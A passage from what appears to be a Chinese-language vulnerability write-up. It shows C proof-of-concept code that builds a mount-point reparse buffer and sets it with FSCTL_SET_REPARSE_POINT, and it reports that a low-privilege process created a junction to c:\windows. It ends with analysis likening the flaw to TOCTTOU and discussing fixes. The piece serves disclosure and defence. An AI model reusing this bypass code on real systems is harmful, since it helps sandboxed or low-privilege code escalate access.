                                      FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                      FILE_DIRECTORY_FILE);
               if ( status_2 ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    pBuffer->ReparseDataLength = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 - 8 ;
    pBuffer->Reserved = 0 ; 
    pBuffer->MountPointReparseBuffer.SubstituteNameLength = wcslen(NtPath) * 2 ;
    pBuffer->MountPointReparseBuffer.SubstituteNameOffset = 0 ; 
    pBuffer->MountPointReparseBuffer.PrintNameLength = wcslen(wdospath) * 2 ;
    pBuffer->MountPointReparseBuffer.PrintNameOffset = wcslen(NtPath) * 2 + 2 ; 
    memcpy((PCHAR)pBuffer->MountPointReparseBuffer.PathBuffer , (PCHAR)NtPath , wcslen(NtPath) * 2 + 2);
    memcpy((PCHAR)((PCHAR)pBuffer->MountPointReparseBuffer.PathBuffer + wcslen(NtPath) * 2 + 2) ,
     (PCHAR)wdospath ,
     wcslen(wdospath) * 2 + 2) ; 
    buffsize = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 ;
    DeviceIoControl(hlink , FSCTL_SET_REPARSE_POINT , pBuffer , buffsize, NULL , 0 , &btr , 0 );
测试程序成功的截图如下:
可以看到低权限的poc_mklink成功创建目录1,链接到c:windows的junction。
**漏洞修复**
这个问题的本质和TOCTTOU类似,检查的时机和状态,同使用无法完全一致导致。
从攻击手法来说,微软可以继续封堵沙盒进程修改DeviceMap,这是比较简单也容易想到的办法,但是可能还会有其他方式绕过ZwOpenFile,想要沿用当前的防御策略,完美地防护Mount
Point是并不容易的:)